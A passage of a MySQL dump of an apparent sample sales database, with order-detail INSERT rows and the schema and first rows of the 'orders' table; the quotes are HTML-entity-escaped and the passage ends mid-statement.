INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;19\u0026#39;, \u0026#39;50.86\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;105.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10413\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;201.57\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10413\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;145.04\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10413\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;173.02\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10413\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;133.57\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10413\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;56.55\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10413\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;51\u0026#39;, \u0026#39;53.31\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;114.24\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;77.42\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;128.39\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;85.71\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;83.38\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;108.14\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;60\u0026#39;, \u0026#39;72.58\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;51\u0026#39;, \u0026#39;72.96\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;62.00\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;74.48\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;61.44\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;84.14\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;84.41\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;54.60\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10415\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;51\u0026#39;, \u0026#39;86.81\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10415\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;60.97\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10415\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;59.83\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10415\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;73.32\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10415\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;43.20\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;129.31\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;70.96\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;90.82\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;62.46\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;64.83\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;70.28\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;86.90\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;68.10\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;39.71\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;88.60\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;84.76\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;98.48\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;65.60\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;63.67\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10417\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;79.43\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10417\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;116.56\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10417\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;162.67\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10417\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;144.60\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10417\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;58.75\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10417\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;109.32\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;16\u0026#39;, \u0026#39;70.76\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;139.64\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;56.57\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;120.53\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;52\u0026#39;, \u0026#39;64.41\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;10\u0026#39;, \u0026#39;66.29\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;36.61\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;100.01\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;72.41\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;12\u0026#39;, \u0026#39;182.90\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;10\u0026#39;, \u0026#39;111.57\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;64.64\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;99.04\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;117.48\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;100.80\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;67.76\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;133.72\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;116.16\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;165.95\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;114.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;32.10\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;52.66\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;112.34\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;153.00\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;52.06\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;116.96\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;73.62\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;68.42\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;60\u0026#39;, \u0026#39;60.26\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;48.80\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;32.19\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;76.33\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;115.09\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;77.05\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;104.94\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;35.29\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10421\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;167.06\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10421\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;44.80\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10422\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;51\u0026#39;, \u0026#39;91.44\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10422\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;47.44\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10423\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;10\u0026#39;, \u0026#39;89.15\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10423\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;56.21\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10423\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;98.44\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10423\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;80.36\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10423\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;78.89\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10424\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;201.44\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10424\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;121.64\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10424\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;54\u0026#39;, \u0026#39;108.50\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10424\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;40.25\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10424\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;54.94\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10424\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;85.98\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;131.49\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;95.99\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;147.36\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;117.82\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;19\u0026#39;, \u0026#39;48.62\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;140.55\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;107.76\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;53.75\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;127.79\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;31.82\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;83.79\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;50.32\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;94.92\u0026#39;, \u0026#39;2\u0026#39;); -- ---------------------------- -- Table structure for `orders` -- ---------------------------- DROP TABLE IF EXISTS `orders`; CREATE TABLE `orders` ( `orderNumber` int(11) NOT NULL, `orderDate` date NOT NULL, `requiredDate` date NOT NULL, `shippedDate` date DEFAULT NULL, `status` varchar(15) NOT NULL, `comments` text, `customerNumber` int(11) NOT NULL, PRIMARY KEY (`orderNumber`), KEY `customerNumber` (`customerNumber`), CONSTRAINT `orders_ibfk_1` FOREIGN KEY (`customerNumber`) REFERENCES `customers` (`customerNumber`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of orders -- ---------------------------- INSERT INTO `orders` VALUES (\u0026#39;10100\u0026#39;, \u0026#39;2013-01-06\u0026#39;, \u0026#39;2013-01-13\u0026#39;, \u0026#39;2013-01-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;363\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10101\u0026#39;, \u0026#39;2013-01-09\u0026#39;, \u0026#39;2013-01-18\u0026#39;, \u0026#39;2013-01-11\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Check on availability.\u0026#39;, \u0026#39;128\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10102\u0026#39;, \u0026#39;2013-01-10\u0026#39;, \u0026#39;2013-01-18\u0026#39;, \u0026#39;2013-01-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;181\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;2013-01-29\u0026#39;, \u0026#39;2013-02-07\u0026#39;, \u0026#39;2013-02-02\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;121\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;2013-01-31\u0026#39;, \u0026#39;2013-02-09\u0026#39;, \u0026#39;2013-02-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;2013-02-11\u0026#39;, \u0026#39;2013-02-21\u0026#39;, \u0026#39;2013-02-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;145\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;2013-02-17\u0026#39;, \u0026#39;2013-02-24\u0026#39;, \u0026#39;2013-02-21\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;278\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;2013-02-24\u0026#39;, \u0026#39;2013-03-03\u0026#39;, \u0026#39;2013-02-26\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Difficult to negotiate with customer. We need more marketing materials\u0026#39;, \u0026#39;131\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;2013-03-03\u0026#39;, \u0026#39;2013-03-12\u0026#39;, \u0026#39;2013-03-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;385\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10109\u0026#39;, \u0026#39;2013-03-10\u0026#39;, \u0026#39;2013-03-19\u0026#39;, \u0026#39;2013-03-11\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that FedEx Ground is used for this shipping\u0026#39;, \u0026#39;486\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;2013-03-18\u0026#39;, \u0026#39;2013-03-24\u0026#39;, \u0026#39;2013-03-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;187\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10111\u0026#39;, \u0026#39;2013-03-25\u0026#39;, \u0026#39;2013-03-31\u0026#39;, \u0026#39;2013-03-30\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;129\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10112\u0026#39;, \u0026#39;2013-03-24\u0026#39;, \u0026#39;2013-04-03\u0026#39;, \u0026#39;2013-03-29\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that ad materials (such as posters, pamphlets) be included in the shippment\u0026#39;, \u0026#39;144\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10113\u0026#39;, \u0026#39;2013-03-26\u0026#39;, \u0026#39;2013-04-02\u0026#39;, \u0026#39;2013-03-27\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;2013-04-01\u0026#39;, \u0026#39;2013-04-07\u0026#39;, \u0026#39;2013-04-02\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;172\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10115\u0026#39;, \u0026#39;2013-04-04\u0026#39;, \u0026#39;2013-04-12\u0026#39;, \u0026#39;2013-04-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;424\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10116\u0026#39;, \u0026#39;2013-04-11\u0026#39;, \u0026#39;2013-04-19\u0026#39;, \u0026#39;2013-04-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;381\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;2013-04-16\u0026#39;, \u0026#39;2013-04-24\u0026#39;, \u0026#39;2013-04-17\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;148\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10118\u0026#39;, \u0026#39;2013-04-21\u0026#39;, \u0026#39;2013-04-29\u0026#39;, \u0026#39;2013-04-26\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer has worked with some of our vendors in the past and is aware of their MSRP\u0026#39;, \u0026#39;216\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;2013-04-28\u0026#39;, \u0026#39;2013-05-05\u0026#39;, \u0026#39;2013-05-02\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;382\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;2013-04-29\u0026#39;, \u0026#39;2013-05-08\u0026#39;, 